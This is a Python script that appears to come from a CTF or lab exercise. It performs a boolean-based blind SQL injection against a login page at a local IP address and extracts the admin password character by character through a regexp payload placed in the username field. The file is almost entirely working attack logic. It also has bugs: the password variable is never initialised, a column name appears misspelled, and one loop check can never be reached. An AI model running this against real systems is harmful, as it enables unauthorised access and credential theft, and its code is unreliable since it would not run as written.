#!/usr/bin/env python3
from bs4 import BeautifulSoup
from urllib import request,parse

url = 'http://192.168.5.50/index.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0',
    'Accept-Encoding':'gzip, deflate',
    'Accept-Language':'zh-CN,zh;q=0.9',
	'Referer':'http://192.168.5.50/index.php'
}

#words = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0','/','\\','.',':',';','<','>',',','?','\'','"','{','}','[',']','~','!','@']


if __name__ == '__main__':
	while(1):
		#for test_word in words:
		for asc in range(45, 127):
			word = chr(asc)
			payload = "admin' and binary pssword regexp '^{}{}.*'".format(password, word)
			data = {
				'username': payload,
				'password': '123456'
			}
			data = parse.urlencode(data).encode('utf-8')
			req = request.Request(url=url, headers=headers, data=data);
			page = request.urlopen(req).read()
			page = page.decode('utf-8')
			#print(page)
			soup = BeautifulSoup(page, 'lxml')
			return_text = soup.find('font').get_text()
			#print(return_text)
			print('payload==>>{}'.format(payload))
			if(return_text == 'password error!'):
				#success
				password += word
				#print(1)
				print(password)
				break
			else:
				#fail
				#print(2)
				if(asc == 127):
					#如果没有找到匹配的字符，则用#填充
					password += '#'
				continue
		if(len(password) == 32):
			break